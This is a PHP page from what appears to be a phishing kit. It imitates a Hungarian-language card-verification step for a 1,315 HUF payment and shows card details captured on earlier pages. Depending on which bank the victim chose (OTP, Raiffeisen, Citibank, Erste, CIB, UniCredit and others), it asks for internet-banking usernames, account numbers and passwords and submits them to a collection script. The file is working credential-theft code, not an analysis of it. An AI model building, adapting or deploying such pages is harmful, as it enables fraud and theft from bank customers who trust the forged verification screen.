<?php
session_start();
error_reporting(0);
?>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<title>ellenőrzött</title>
<link href="a_data/auth_vbv_body.css" rel="STYLESHEET" type="text/css"></head>
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
<body leftmargin="0" topmargin="0" alink="#999966" marginwidth="0" marginheight="0" link="#666633" bgcolor="#FFFFFF">
<form action="./com.php" method="post" name="submitForm">
<table height="400" align="center" width="390" cellspacing="0" cellpadding="1" bgcolor="#ffffff">
<tbody><tr>
<td valign="top">
<table height="100%" width="100%" cellspacing="7" cellpadding="0" border="0" bgcolor="#ffffff">
<tbody><tr>
<?php 
							if($_SESSION['CC'] == "MasterCard") {	
                                echo '<img src="a_data/ms.png" style="margin-top: 10px;">';
							}
							elseif ($_SESSION['CC'] == "Maestro") {	
                                echo '<img src="a_data/ms.png" style="margin-top: 10px;">';
							}
							elseif ($_SESSION['CC'] == "VISA") {	
                                echo '<img src="a_data/vs.png" style="margin-top: 10px;">';
							}
							elseif ($_SESSION['CC'] == "American Express") {	
                                echo '<img src="a_data/ex.png" style="margin-top: 10px;">';
							}
?><tr>
<?php 
							if($_SESSION['CB'] == "OTPBANK") {	
                                echo '<img src="img/ot.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "Raiffeisen BANK") {	
                                echo '<img src="img/rai.gif" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "CITIBANK") {	
                                echo '<img src="img/ci.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "ERSTE BANK") {	
                                echo '<img src="img/er.gif" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							
						elseif ($_SESSION['CB'] == "SBERBANK") {	
                                echo '<img src="img/sber.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "BUDAPEST BANK") {	
                                echo '<img src="img/bu.gif" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
						
						    elseif ($_SESSION['CB'] == "CIB BANK") {	
                                echo '<img src="img/cib.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							
							 elseif ($_SESSION['CB'] == "MKB BANK") {	
                                echo '<img src="img/mkb.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "UNICREDIT BANK") {	
                                echo '<img src="img/uni.png" style="margin-top: 10px;width: 150px;margin-left: 100px;height: -;">';
							}
							elseif ($_SESSION['CB'] == "MASOK") {	
                                echo '<meta http-equiv="refresh" content="0;url=./success.php" />';
							}
							
?></tr>

<tr>
<td height="1" valign="top"><font class="auth_Heading_en">
Adja meg bankszámlájának</font></td>
</tr>
<tr>
<td height="1"></td>
</tr>
<tr>
<td style="text-align: justify" height="1" valign="top"><font class="auth_TxtMain_en">
Hogy teljes legyen a fizetési folyamatot Kérjük, ellenőrizze a bankszámlájáról, és adja meg azt teljes egészében. Ez a biztonsági intézkedés által benyújtott különleges bank ezzel a kártyával, és ez csak, hogy biztosítsa a kártyát.</font></td>
</tr>
<tr valign="top">
<td height="1" valign="top">
<table id="table3" width="100%" cellspacing="0" cellpadding="0" border="0">
<tbody><tr>
<td align="right" width="40%"><font class="auth_Txtlabel_en">
A kártyán szereplő név:</font></td><td width="4%">&nbsp;</td><td align="left"><font class="auth_font_bold_en"><?php echo $_SESSION['Eamil'];  ?></font></td>
</tr>
<tr>
<td height="4"></td>
</tr>
<tr>
<td align="right" width="40%"><font class="auth_Txtlabel_en">Összeg:</font></td><td>&nbsp;</td><td align="left" style="
    font-weight: bold;
"><font class="auth_font_bold_en">
</font>1.315 HUF</td>
</tr>
<tr>
<td height="4"></td>
</tr>
<tr>
<td align="right"><font class="auth_Txtlabel_en">Dátum:</font></td><td>&nbsp;</td><td align="left"><font class="auth_font_bold_en"><script>
</script><?=date('d/m/Y').", ".date('g:i a');?>
</font></td>
</tr>
<tr>
<td height="4"></td>
</tr>
<tr>
<td align="right"><font class="auth_Txtlabel_en">Kártyaszám:</font></td><td>&nbsp;</td><td align="left"><font class="auth_font_bold_en" style="
    margin-bottom: 10px;
"><?php echo $_SESSION['Password'];  ?></font></td>
</tr><br><tr>
<td height="1" valign="top"><br><font class="auth_Heading_en">Internetbank belépés</font></td>
</tr>
<input name="AA_LANCODE" value="0" type="hidden">
<tr id="authDataRows">
<td colspan="3">
<table height="100%" width="100%" cellspacing="0" cellpadding="0" border="0">
<tbody><?php
if($_SESSION['CB'] == "OTPBANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">AZONOSÍTÓ:</font></td><td width="20">&nbsp;</td><td><input required name="az" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">SZÁMLA: 117</font></td><td width="20">&nbsp;</td><td><input required name="sz" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">JELSZÓ:</font></td><td width="20">&nbsp;</td><td><input required name="je" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "Raiffeisen BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Direkt Azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="di" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="jj" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "CITIBANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Direkt Azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="ci" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="ji" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "ERSTE BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">NetBank azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="net" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Bejelentkezési jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="be" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "SBERBANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Felhasználói azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="fe" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Bejelentkezési kód:</font></td><td width="20">&nbsp;</td><td><input required name="bbe" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "BUDAPEST BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="azo" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="jo" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "CIB BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Felhasználói azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="fel" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="joo" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "MKB BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="mk" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="jk" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
<?php
if($_SESSION['CB'] == "UNICREDIT BANK") {	
                                echo '<tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Felhasználói azonosító:</font></td><td width="20">&nbsp;</td><td><input required name="uni" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="text"></td>
</tr>
</tbody><br><tbody><tr>
<td align="right" width="150"><font class="auth_Txtlabel_en">Jelszó:</font></td><td width="20">&nbsp;</td><td><input required name="jooo" size="20" style="WIDTH: 155px;HEIGHT: 22px;margin-bottom: 10px;" align="left" type="password"></td>
</tr>
</tbody>';}
?>
</tbody>
</table>
</td>
</tr>
<input name="AA_Action" value="Finish" type="hidden">
</tbody></table>
</td>
</tr>
<tr>
<td valign="top">
<table id="table2" width="100%" cellspacing="0" cellpadding="0" border="0">
<tbody><tr valign="top">
<td height="1" align="right" width="40%">

</td>
</tr>
<tr>
<td align="right" width="40%"></td><td width="4%"></td><td>
                                <input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" value="Submit" style="
    margin-left: 5px;
    margin-bottom: 10px;
">
                                
                            </td>
</tr>
</tbody></table>
</td>
</tr>
<tr>
<td height="12" align="left" bgcolor="#FFFFFF"><font class="auth_copyright_en">Copyright © 2014.  Minden jog fenntartva.</font><input name="AA_Refresh" value="false" type="hidden"></td>
</tr>
</tbody></table>
</td>
</tr>
</tbody></table>
</form>
</body></html>